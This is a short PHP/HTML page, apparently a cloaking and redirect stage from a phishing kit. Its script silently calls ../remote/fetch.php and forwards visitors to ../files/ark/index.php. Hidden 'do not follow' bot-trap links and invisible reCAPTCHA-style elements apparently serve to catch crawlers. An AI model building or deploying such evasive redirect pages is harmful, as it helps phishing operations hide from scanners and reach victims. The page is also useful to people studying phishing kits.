<?php
//Dwi F.D 
error_reporting(E_ALL);
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta name="keywords" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>&nbsp; | &nbsp;</title>
  <style>
    .genCSS {
      color: white;
      font-size: 11px;
      position: absolute;
      left: 0px;
      top: 0px;
      z-index: -13;
    }

    a {
      text-decoration: none !important;
    }

    p {
      margin-top: 300%;
    }
  </style>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
  <script>
    $.get("../remote/fetch.php", function(data, status) {
      window.location.href = '../files/ark/index.php';
    });
  </script>
</head>

<body>

  
    <noscript><a rel="nofollow" style="display:none;" href="../vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
    </noscript>
    <a rel="nofollow" style="display:none;" href="../vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>

  <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
    <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div>
    <div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div>
    <div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div>
    <div style="z-index: 2000000000; position: relative;"></div>
  </div>
</body>

</html>